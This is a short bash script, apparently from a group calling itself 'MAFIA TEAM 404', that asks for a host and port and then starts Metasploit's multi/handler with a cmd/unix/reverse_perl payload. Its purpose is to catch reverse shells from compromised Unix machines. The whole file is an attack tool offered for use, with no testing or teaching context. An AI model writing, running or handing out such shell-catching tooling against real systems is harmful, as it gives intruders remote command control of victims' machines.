#!/bin/bash
figlet MAFIA TEAM 404

read -p 'Put the IP or host to open a session ~~>' ip
echo ' '
read -p 'Put the port to open a session       ~~>' port

msfconsole -q -x 'use exploit/multi/handler' -x 'set PAYLOAD cmd/unix/reverse_perl' -x 'set LHOST '$ip -x 'set LPORT '$port -x 'exploit'
